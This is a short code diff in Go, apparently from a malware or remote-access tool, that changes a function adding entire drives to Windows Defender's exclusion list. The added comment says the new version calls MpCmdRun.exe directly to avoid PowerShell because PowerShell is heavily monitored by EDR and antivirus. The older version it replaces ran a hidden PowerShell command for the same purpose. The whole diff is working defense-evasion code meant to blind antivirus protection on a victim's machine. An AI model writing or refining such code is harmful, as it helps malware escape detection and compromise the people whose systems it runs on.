@@ -1680,11 +1680,13 @@ func elevate() string {
 // ================================================================
 
 func excludeDrive(drives []string) string {
+	// Use MpCmdRun.exe directly — avoids PowerShell (heavily monitored by EDR/AV)
+	mpCmdRun := filepath.Join(os.Getenv("ProgramFiles"), "Windows Defender", "MpCmdRun.exe")
 	var results []string
 	for _, d := range drives {
-		out, err := shellExec(fmt.Sprintf(`powershell -NoP -NonI -W Hidden -Command "Add-MpPreference -ExclusionPath '%s'"`, d))
+		out, err := shellExec(fmt.Sprintf(`"%s" -AddExclusion -ExclusionType Path -ExclusionPath "%s"`, mpCmdRun, d))
 		if err != nil {
-			results = append(results, fmt.Sprintf("%s: FAILED", d))
+			results = append(results, fmt.Sprintf("%s: FAILED (%v)", d, err))
 		} else {
 			results = append(results, fmt.Sprintf("%s: OK (%s)", d, strings.TrimSpace(out)))
 		}
